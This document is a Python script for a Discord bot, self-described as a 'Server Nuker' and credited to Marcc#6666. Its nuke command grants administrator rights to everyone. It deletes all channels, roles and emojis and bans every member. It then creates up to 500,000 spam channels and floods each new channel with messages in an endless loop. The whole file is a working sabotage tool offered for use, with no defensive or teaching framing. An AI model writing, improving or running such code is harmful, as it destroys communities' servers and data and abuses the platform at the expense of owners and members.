import discord
from discord.ext import commands
import random
import os
from discord import Permissions
from colorama import Fore, Style
import asyncio

os.system("title     Server Nuker     $     Marcc#6666")

token = input(f"{Fore.RED}[{Fore.GREEN}-->{Fore.RED}]{Fore.RESET} Discord Bot Token: ")


SPAM_CHANNEL =  input(f"{Fore.RED}[{Fore.GREEN}-->{Fore.RED}]{Fore.RESET} Channel Name: ")
SPAM_MESSAGE =  input(f"{Fore.RED}[{Fore.GREEN}-->{Fore.RED}]{Fore.RESET} Spam Message: ")

client = commands.Bot(command_prefix= input(f"{Fore.RED}[{Fore.GREEN}-->{Fore.RED}]{Fore.RESET} Prefix: "))

print(f"{Fore.RED}[{Fore.GREEN}-->{Fore.RED}]{Fore.RESET} type [prefix]nuke")

@client.event
async def on_ready():

   await client.change_presence(activity=discord.Game(name="By Marcc#6666"))

@client.command()
@commands.is_owner()
async def stop(ctx):
    await ctx.bot.logout()
    print (Fore.GREEN + f"{client.user.name} has logged out successfully." + Fore.RESET)

@client.command()
async def nuke(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    try:
      role = discord.utils.get(guild.roles, name = "@everyone")
      await role.edit(permissions = Permissions.all())
      print(f"{Fore.GREEN}[{Fore.GREEN}!{Fore.GREEN}]{Fore.RESET} Everyone got Admin!")
    except:
      print(f"{Fore.RED}[{Fore.RED}?{Fore.RED}]{Fore.RESET} Cant give everyone Admin!")
    for channel in guild.channels:
      try:
        await channel.delete()
        print(f"{Fore.GREEN}[{Fore.GREEN}!{Fore.GREEN}]{Fore.RESET} {channel.name} deleted!")
      except:
        print(f"{Fore.RED}[{Fore.RED}?{Fore.RED}]{Fore.RESET} {channel.name} Not deleted!")
    for member in guild.members:
     try:
       await member.ban()
       print(f"{Fore.GREEN}[{Fore.GREEN}!{Fore.GREEN}]{Fore.RESET} {channel.name} {member.name} banned!")
     except:
       print(f"{Fore.RED}[{Fore.RED}?{Fore.RED}]{Fore.RESET} {channel.name} {member.name} not banned!")
    for role in guild.roles:
     try:
       await role.delete()
       print(f"{Fore.GREEN}[{Fore.GREEN}!{Fore.GREEN}]{Fore.RESET} {role.name} deleted")
     except:
       print(f"{Fore.RED}[{Fore.RED}?{Fore.RED}]{Fore.RESET} {role.name} not deleted")
    for emoji in list(ctx.guild.emojis):
     try:
       await emoji.delete()
       print(f"{Fore.GREEN}[{Fore.GREEN}!{Fore.GREEN}]{Fore.RESET} {emoji.name} deleted")
     except:
       print(f"{Fore.RED}[{Fore.RED}?{Fore.RED}]{Fore.RESET} {emoji.name} not deleted")
    banned_users = await guild.bans()
    for ban_entry in banned_users:
      user = ban_entry.user
      try:
        await user.unban("Marcc#6666")
        print(Fore.MAGENTA + f"{user.name}#{user.discriminator} Was successfully unbanned." + Fore.RESET)
      except:
        print(Fore.GREEN + f"{user.name}#{user.discriminator} Was not unbanned." + Fore.RESET)
    await guild.create_text_channel("By Marcc#6666")
    for channel in guild.text_channels:
        link = await channel.create_invite(max_age = 0, max_uses = 0)
        print(f"{Fore.GREEN}[{Fore.GREEN}!{Fore.GREEN}]{Fore.RESET} New Invite: {link}")
    amount = 500000
    for i in range(amount):
       await guild.create_text_channel(random.choice(SPAM_CHANNEL))
    print(f"{Fore.GREEN}[{Fore.GREEN}!{Fore.GREEN}]{Fore.RESET} Nuked {guild.name} successfully.")
    return

@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(SPAM_MESSAGE))

client.run(token, bot=True)